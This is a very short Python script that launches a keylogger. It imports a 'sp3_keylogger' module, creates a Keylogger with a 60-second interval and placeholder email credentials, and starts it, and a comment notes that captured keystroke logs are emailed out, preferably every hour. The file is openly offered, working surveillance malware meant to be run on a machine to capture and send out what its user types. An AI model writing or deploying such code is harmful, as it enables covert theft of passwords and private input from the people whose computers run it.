#!/usr/bin/env python

import sp3_keylogger

my_keylogger = sp3_keylogger.Keylogger(60, "youremail", "youremailpassowrod") #
                                       #60 for 1 mintute, i prefer to email a log after an hour but it's completely optional
my_keylogger.start()